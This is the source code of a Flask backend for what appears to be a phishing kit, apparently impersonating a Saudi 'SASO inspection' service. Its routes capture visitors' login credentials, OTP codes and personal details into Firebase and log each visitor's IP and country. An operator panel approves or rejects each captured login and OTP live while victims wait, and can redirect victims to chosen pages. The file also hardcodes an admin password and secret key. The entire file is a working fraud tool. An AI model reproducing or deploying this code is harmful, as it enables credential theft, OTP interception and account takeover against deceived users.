from flask import Flask, request, jsonify, render_template, session, redirect, url_for, make_response
import os
import json
import datetime
import uuid
import time
import requests

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "super_secret_key_for_admin_panel")

app.static_folder = os.path.join(os.path.dirname(__file__))
app.template_folder = os.path.join(os.path.dirname(__file__))

FIREBASE_DB_URL = "https://saso-inspection-default-rtdb.firebaseio.com"

# ============ نماذج قاعدة البيانات (Firebase RTDB Wrapper) ============

class UserSession:
    def __init__(self, data_dict):
        self.id = data_dict.get('id')
        self.session_id = data_dict.get('session_id')
        self.ip_address = data_dict.get('ip_address')
        self.country = data_dict.get('country')
        self.current_page = data_dict.get('current_page')
        la = data_dict.get('last_activity')
        self.last_activity = datetime.datetime.fromisoformat(la) if la else datetime.datetime.now()
        self.redirect_to = data_dict.get('redirect_to')
        
        reqs_data = data_dict.get('requests', {})
        self.requests = [ClientRequest(rid, rval) for rid, rval in reqs_data.items() if isinstance(rval, dict)]

    def save(self):
        payload = {
            "id": self.id,
            "session_id": self.session_id,
            "ip_address": self.ip_address,
            "country": self.country,
            "current_page": self.current_page,
            "last_activity": self.last_activity.isoformat() if self.last_activity else None,
            "redirect_to": self.redirect_to
        }
        requests.patch(f"{FIREBASE_DB_URL}/users/{self.id}.json", json=payload)

    @staticmethod
    def query_filter_by_session_id(sid):
        try:
            res = requests.get(f"{FIREBASE_DB_URL}/users.json").json()
            if not res or not isinstance(res, dict):
                return None
            for uid, val in res.items():
                if isinstance(val, dict) and val.get('session_id') == sid:
                    return UserSession(val)
        except Exception:
            pass
        return None

    @staticmethod
    def query_all():
        try:
            res = requests.get(f"{FIREBASE_DB_URL}/users.json").json()
            if not res or not isinstance(res, dict):
                return []
            return [UserSession(val) for val in res.values() if isinstance(val, dict)]
        except Exception:
            return []

    @staticmethod
    def query_get(uid):
        try:
            res = requests.get(f"{FIREBASE_DB_URL}/users/{uid}.json").json()
            if not res or not isinstance(res, dict):
                return None
            return UserSession(res)
        except Exception:
            return None


class ClientRequest:
    def __init__(self, req_id, data_dict):
        self.id = req_id
        self.user_id = data_dict.get('user_id')
        self.type = data_dict.get('type')
        self.data = data_dict.get('data')
        self.status = data_dict.get('status', 'pending')
        ts = data_dict.get('timestamp')
        self.timestamp = datetime.datetime.fromisoformat(ts) if ts else datetime.datetime.now()
        aat = data_dict.get('admin_action_time')
        self.admin_action_time = datetime.datetime.fromisoformat(aat) if aat else None

    def save(self):
        payload = {
            "user_id": self.user_id,
            "type": self.type,
            "data": self.data,
            "status": self.status,
            "timestamp": self.timestamp.isoformat() if self.timestamp else None,
            "admin_action_time": self.admin_action_time.isoformat() if self.admin_action_time else None
        }
        requests.patch(f"{FIREBASE_DB_URL}/client_requests/{self.id}.json", json=payload)
        requests.patch(f"{FIREBASE_DB_URL}/users/{self.user_id}/requests/{self.id}.json", json=payload)

    @staticmethod
    def query_get(req_id):
        try:
            res = requests.get(f"{FIREBASE_DB_URL}/client_requests/{req_id}.json").json()
            if not res or not isinstance(res, dict):
                return None
            return ClientRequest(req_id, res)
        except Exception:
            return None


# ============ دوال مساعدة ============

def get_user_session_id():
    sid = request.cookies.get('user_session_id')
    if not sid:
        sid = str(uuid.uuid4())
    return sid


def get_or_create_user(current_page=""):
    sid = get_user_session_id()
    user = UserSession.query_filter_by_session_id(sid)
    if not user:
        user_id = str(uuid.uuid4())
        user_data = {
            "id": user_id,
            "session_id": sid,
            "ip_address": request.remote_addr,
            "country": None,
            "current_page": current_page,
            "last_activity": datetime.datetime.now().isoformat(),
            "redirect_to": None,
            "requests": {}
        }
        requests.put(f"{FIREBASE_DB_URL}/users/{user_id}.json", json=user_data)
        user = UserSession(user_data)
    return user, sid


def get_country_from_ip(ip_address):
    try:
        import urllib.request
        api_url = f"http://ip-api.com/json/{ip_address}?fields=country"
        req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=3) as response:
            result = json.loads(response.read().decode())
            return result.get('country', 'غير معروف')
    except Exception:
        return 'غير معروف'


# ============ مسارات التطبيق ============

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/<path:filename>")
def serve_static(filename):
    if filename.endswith((".log", ".py", ".db")):
        return "Access Denied", 403
    return app.send_static_file(filename)


# ---- Admin Login ----
@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        password = request.form.get("password")
        if password == os.environ.get("ADMIN_PASSWORD", "Ha09876@@"):
            session["logged_in"] = True
            return redirect(url_for("admin_panel"))
        else:
            return render_template("admin_login.html", error="كلمة المرور غير صحيحة")
    return render_template("admin_login.html")


@app.route("/admin/logout")
def admin_logout():
    session.pop("logged_in", None)
    return redirect(url_for("admin_login"))


@app.route("/admin")
def admin_panel():
    if not session.get("logged_in"):
        return redirect(url_for("admin_login"))
    return render_template("admin.html")


# ---- API: كل الجلسات مع كل البيانات مجمعة ----
@app.route("/admin/all_requests")
def get_all_requests():
    if not session.get("logged_in"):
        return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401

    all_sessions = UserSession.query_all()
    sessions_list = []

    for user in all_sessions:
        user_data = {}
        has_data = False
        for r in user.requests:
            has_data = True
            if r.data and isinstance(r.data, dict):
                user_data.update(r.data)

        if not has_data:
            continue

        sessions_list.append({
            "id": user.id,
            "session_id": user.session_id,
            "ip_address": user.ip_address,
            "country": user.country or "غير معروف",
            "current_page": user.current_page,
            "last_activity": user.last_activity.isoformat() if user.last_activity else None,
            "data": user_data,
            "login_status": next((r.status for r in sorted(user.requests, key=lambda x: x.timestamp, reverse=True) if r.type == 'login'), None),
            "otp_status": next((r.status for r in sorted(user.requests, key=lambda x: x.timestamp, reverse=True) if r.type == 'otp'), None),
        })

    sessions_list.sort(key=lambda x: x.get('last_activity', '') or '', reverse=True)
    return jsonify(sessions_list)


# ---- API: تفاصيل جلسة واحدة ----
@app.route("/admin/request_details/<session_id>")
def get_request_details(session_id):
    if not session.get("logged_in"):
        return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401

    user = UserSession.query_filter_by_session_id(session_id)
    if not user:
        return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404

    user_data = {}
    for r in user.requests:
        if r.data and isinstance(r.data, dict):
            user_data.update(r.data)

    return jsonify({
        "id": user.id,
        "session_id": user.session_id,
        "ip_address": user.ip_address,
        "country": user.country or "غير معروف",
        "current_page": user.current_page,
        "data": user_data,
        "login_status": next((r.status for r in user.requests if r.type == 'login'), None),
        "otp_status": next((r.status for r in user.requests if r.type == 'otp'), None),
    })


# ---- Admin Approve/Reject Login ----
@app.route("/admin/approve_login/<user_session_id>")
def admin_approve_login(user_session_id):
    if not session.get("logged_in"):
        return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401
    user = UserSession.query_filter_by_session_id(user_session_id)
    if not user:
        return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
    latest_login = None
    for r in user.requests:
        if r.type == 'login' and r.status == 'pending':
            if latest_login is None or r.timestamp > latest_login.timestamp:
                latest_login = r
    if latest_login:
        latest_login.status = "approved"
        latest_login.admin_action_time = datetime.datetime.now()
        latest_login.save()
    return jsonify({"status": "success", "message": "تمت الموافقة على تسجيل الدخول"})


@app.route("/admin/reject_login/<user_session_id>")
def admin_reject_login(user_session_id):
    if not session.get("logged_in"):
        return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401
    user = UserSession.query_filter_by_session_id(user_session_id)
    if not user:
        return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
    latest_login = None
    for r in user.requests:
        if r.type == 'login' and r.status == 'pending':
            if latest_login is None or r.timestamp > latest_login.timestamp:
                latest_login = r
    if latest_login:
        latest_login.status = "rejected"
        latest_login.admin_action_time = datetime.datetime.now()
        latest_login.save()
    return jsonify({"status": "success", "message": "تم رفض تسجيل الدخول"})


# ---- Admin Approve/Reject OTP ----
@app.route("/admin/approve_otp/<user_session_id>")
def admin_approve_otp(user_session_id):
    if not session.get("logged_in"):
        return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401
    user = UserSession.query_filter_by_session_id(user_session_id)
    if not user:
        return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
    latest_otp = None
    for r in user.requests:
        if r.type == 'otp' and r.status == 'pending':
            if latest_otp is None or r.timestamp > latest_otp.timestamp:
                latest_otp = r
    if latest_otp:
        latest_otp.status = "approved"
        latest_otp.admin_action_time = datetime.datetime.now()
        latest_otp.save()
    return jsonify({"status": "success", "message": "تمت الموافقة على OTP"})


@app.route("/admin/reject_otp/<user_session_id>")
def admin_reject_otp(user_session_id):
    if not session.get("logged_in"):
        return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401
    user = UserSession.query_filter_by_session_id(user_session_id)
    if not user:
        return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
    latest_otp = None
    for r in user.requests:
        if r.type == 'otp' and r.status == 'pending':
            if latest_otp is None or r.timestamp > latest_otp.timestamp:
                latest_otp = r
    if latest_otp:
        latest_otp.status = "rejected"
        latest_otp.admin_action_time = datetime.datetime.now()
        latest_otp.save()
    return jsonify({"status": "success", "message": "تم رفض OTP"})


# ---- Submit Request ----
@app.route("/submit_request", methods=["POST"])
def submit_request():
    if not request.is_json:
        return jsonify({"status": "error", "message": "يجب أن يكون الطلب بصيغة JSON"}), 400
    
    req_json = request.get_json()
    if not req_json:
        return jsonify({"status": "error", "message": "بيانات الطلب فارغة"}), 400

    if "type" in req_json and "data" in req_json and isinstance(req_json.get("data"), dict):
        request_type = req_json.get("type")
        user_data = req_json.get("data")
    else:
        user_data = req_json
        if "otp" in user_data or "otp_code" in user_data:
            request_type = "otp"
        elif "username" in user_data or "password" in user_data:
            request_type = "login"
        else:
            request_type = "personal_info"

    try:
        user, sid = get_or_create_user(current_page=request_type)
        user.current_page = request_type
        user.last_activity = datetime.datetime.now()
        if not user.country:
            user.country = get_country_from_ip(user.ip_address)
        user.save()

        auto_approve = request_type in ("personal_info", "watch_request")
        initial_status = "approved" if auto_approve else "pending"

        req_id = str(uuid.uuid4())
        new_req = ClientRequest(req_id, {
            "user_id": user.id,
            "type": request_type,
            "data": user_data,
            "status": initial_status,
            "timestamp": datetime.datetime.now().isoformat(),
            "admin_action_time": datetime.datetime.now().isoformat() if auto_approve else None
        })
        new_req.save()

        resp_status = "approved" if auto_approve else "pending"
        resp_msg = "تم استلام البيانات" if auto_approve else "تم استلام طلبك، بانتظار موافقة المسؤول"
        response = make_response(jsonify({"status": resp_status, "request_id": new_req.id, "message": resp_msg}), 200 if auto_approve else 202)
        response.set_cookie('user_session_id', sid, max_age=86400*30, path='/')
        return response
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


# ---- Request Status (for loading page polling) ----
@app.route("/request_status/<request_id>", methods=["GET", "POST"])
def get_request_status(request_id):
    req = ClientRequest.query_get(request_id)
    if req:
        user = UserSession.query_get(req.user_id)
        return jsonify({"status": req.status, "type": req.type, "data": req.data, "redirect_to": user.redirect_to if user else None})
    return jsonify({"status": "error", "message": "الطلب غير موجود"}), 404


# ---- Track Visit ----
@app.route("/track_visit", methods=["POST"])
def track_visit():
    if request.is_json:
        data = request.get_json()
        page = data.get("page")
        if not page:
            return jsonify({"status": "error", "message": "الصفحة غير محددة"}), 400

        user, sid = get_or_create_user(current_page=page)
        user.current_page = page
        user.last_activity = datetime.datetime.now()
        if not user.country:
            user.country = get_country_from_ip(user.ip_address)
        user.save()

        response = make_response(jsonify({"status": "success", "message": "تم تحديث الزيارة"}))
        response.set_cookie('user_session_id', sid, max_age=86400*30, path='/')
        return response
    return jsonify({"status": "error", "message": "يجب أن يكون الطلب بصيغة JSON"}), 400


# ---- Active Visits ----
@app.route("/admin/active_visits")
def get_active_visits():
    if not session.get("logged_in"):
        return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401

    five_minutes_ago = datetime.datetime.now() - datetime.timedelta(minutes=5)
    all_users = UserSession.query_all()

    visits_list = []
    for user in all_users:
        if user.last_activity and user.last_activity >= five_minutes_ago:
            visits_list.append({
                "session_id": user.session_id,
                "ip_address": user.ip_address,
                "country": user.country,
                "current_page": user.current_page,
                "last_activity": user.last_activity.isoformat()
            })
    return jsonify(visits_list)


# ---- Redirect User ----
@app.route("/admin/redirect_user/<user_session_id>", methods=["POST"])
def admin_redirect_user(user_session_id):
    if not session.get("logged_in"):
        return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401

    if request.is_json:
        data = request.get_json()
        target_page = data.get("target_page")
        if not target_page:
            return jsonify({"status": "error", "message": "الصفحة المستهدفة غير محددة"}), 400

        user = UserSession.query_filter_by_session_id(user_session_id)
        if user:
            user.redirect_to = target_page
            user.save()
            return jsonify({"status": "success", "message": "تم تعيين إعادة التوجيه للمستخدم"})
        return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
    return jsonify({"status": "error", "message": "يجب أن يكون الطلب بصيغة JSON"}), 400


if __name__ == "__main__":
    debug_mode = os.environ.get("FLASK_DEBUG", "0").lower() in ("1", "true", "yes")
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=debug_mode)
